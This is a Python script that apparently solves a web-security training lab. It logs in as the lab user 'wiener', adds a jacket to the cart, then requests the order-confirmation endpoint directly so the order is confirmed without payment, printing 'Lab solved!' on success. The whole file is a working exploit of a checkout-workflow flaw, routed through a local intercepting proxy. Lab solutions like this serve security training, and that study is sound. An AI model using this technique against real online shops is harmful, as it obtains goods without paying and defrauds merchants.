#!/usr/bin/env python3
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    return soup.find("input", {"name": "csrf"})["value"]

def login(s, url, username, password):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    data = {"csrf": csrf, "username": username, "password": password}
    r = s.post(login_page, data=data, verify=False, allow_redirects=True, proxies=proxies, timeout=10)
    if "Log out" in r.text:
        return True
    return False

def add_to_cart(s, url, product_id):
    print(f"[*] Adding product {product_id} to cart...")
    data = {"productId": product_id, "quantity": 1, "redir": "CART"}
    r = s.post(url + "/cart", data=data, verify=False, allow_redirects=False, proxies=proxies, timeout=10)
    if r.status_code in (200, 302):
        return True
    return False

def confirm_order(s, url):
    print("[*] Sending order confirmation...")
    r = s.get(url + "/cart/order-confirmation?order-confirmed=true", verify=False, proxies=proxies, timeout=10)
    if "Congratulations" in r.text:
        print("[+] Order confirmed - Lab solved!")
        return True
    print("[-] Order confirmation failed")
    return False

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if not login(s, url, "wiener", "peter"):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    if not add_to_cart(s, url, "1"):
        print("[-] Failed to add jacket to cart")
        return
    print("[+] Jacket added to cart")

    confirm_order(s, url)

if __name__ == "__main__":
    main()